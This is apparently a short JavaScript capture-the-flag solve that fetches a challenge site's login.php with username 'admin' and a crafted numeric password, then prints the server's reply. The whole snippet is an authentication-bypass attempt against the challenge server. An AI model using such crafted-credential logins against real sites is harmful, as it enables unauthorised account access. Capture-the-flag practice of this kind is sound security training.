const url = 'http://dctf1-chall-very-secure-site.westeurope.azurecontainer.io/login.php?username=admin&password=479763000'
fetch(url).then((x) => x.text()).then((x) => console.log(x));
